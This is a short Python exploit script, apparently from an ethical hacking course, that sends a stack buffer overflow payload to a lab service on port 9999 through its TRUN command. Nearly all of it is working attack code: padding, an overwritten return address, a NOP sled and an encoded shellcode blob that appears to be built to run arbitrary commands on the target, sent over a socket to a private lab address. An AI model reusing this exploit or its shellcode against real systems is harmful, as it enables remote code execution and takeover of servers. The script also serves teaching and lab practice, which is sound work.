#!/usr/bin/python3
# Script:                       bufferoverflowremake.py
# Author:                       Zachary Derrick (TCM: Practical Ethical Hacking)
# Date of latest revision:      2024.01.09
# Purpose:                      This script is a demonstration of a buffer overflow exploit. 
# 								It constructs a payload containing shellcode designed to exploit 
# 								a vulnerability in a target server. The shellcode, represented by 
# 								the 'overflow' variable, aims to execute arbitrary commands on the 
# 								server. The script then attempts to establish a connection to the 
# 								target server at IP address on port 9999 and sends the crafted 
# 								payload using the TRUN command to test and potentially exploit the 
# 								target system.

import sys, socket

overflow = (b"\xdb\xc8\xbe\x4c\xb2\x55\x2a\xd9\x74\x24\xf4\x5a\x29\xc9"
b"\xb1\x52\x31\x72\x17\x03\x72\x17\x83\xa6\x4e\xb7\xdf\xca"
b"\x47\xba\x20\x32\x98\xdb\xa9\xd7\xa9\xdb\xce\x9c\x9a\xeb"
b"\x85\xf0\x16\x87\xc8\xe0\xad\xe5\xc4\x07\x05\x43\x33\x26"
b"\x96\xf8\x07\x29\x14\x03\x54\x89\x25\xcc\xa9\xc8\x62\x31"
b"\x43\x98\x3b\x3d\xf6\x0c\x4f\x0b\xcb\xa7\x03\x9d\x4b\x54"
b"\xd3\x9c\x7a\xcb\x6f\xc7\x5c\xea\xbc\x73\xd5\xf4\xa1\xbe"
b"\xaf\x8f\x12\x34\x2e\x59\x6b\xb5\x9d\xa4\x43\x44\xdf\xe1"
b"\x64\xb7\xaa\x1b\x97\x4a\xad\xd8\xe5\x90\x38\xfa\x4e\x52"
b"\x9a\x26\x6e\xb7\x7d\xad\x7c\x7c\x09\xe9\x60\x83\xde\x82"
b"\x9d\x08\xe1\x44\x14\x4a\xc6\x40\x7c\x08\x67\xd1\xd8\xff"
b"\x98\x01\x83\xa0\x3c\x4a\x2e\xb4\x4c\x11\x27\x79\x7d\xa9"
b"\xb7\x15\xf6\xda\x85\xba\xac\x74\xa6\x33\x6b\x83\xc9\x69"
b"\xcb\x1b\x34\x92\x2c\x32\xf3\xc6\x7c\x2c\xd2\x66\x17\xac"
b"\xdb\xb2\xb8\xfc\x73\x6d\x79\xac\x33\xdd\x11\xa6\xbb\x02"
b"\x01\xc9\x11\x2b\xa8\x30\xf2\x5e\x2d\x38\x0b\x37\x2f\x3c"
b"\x1a\x9b\xa6\xda\x76\x33\xef\x75\xef\xaa\xaa\x0d\x8e\x33"
b"\x61\x68\x90\xb8\x86\x8d\x5f\x49\xe2\x9d\x08\xb9\xb9\xff"
b"\x9f\xc6\x17\x97\x7c\x54\xfc\x67\x0a\x45\xab\x30\x5b\xbb"
b"\xa2\xd4\x71\xe2\x1c\xca\x8b\x72\x66\x4e\x50\x47\x69\x4f"
b"\x15\xf3\x4d\x5f\xe3\xfc\xc9\x0b\xbb\xaa\x87\xe5\x7d\x05"
b"\x66\x5f\xd4\xfa\x20\x37\xa1\x30\xf3\x41\xae\x1c\x85\xad"
b"\x1f\xc9\xd0\xd2\x90\x9d\xd4\xab\xcc\x3d\x1a\x66\x55\x5d"
b"\xf9\xa2\xa0\xf6\xa4\x27\x09\x9b\x56\x92\x4e\xa2\xd4\x16"
b"\x2f\x51\xc4\x53\x2a\x1d\x42\x88\x46\x0e\x27\xae\xf5\x2f"
b"\x62")


shellcode = b"A" * 2003 + b"\xaf\x11\x50\x62" + b"\x90" * 16 + overflow

try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(('10.0.2.40', 9999))
	payload = b'TRUN /:./' + shellcode
	s.send(payload)
	
	
except Exception as e:
	print(f"Error: {e}")
	sys.exit()
			
 
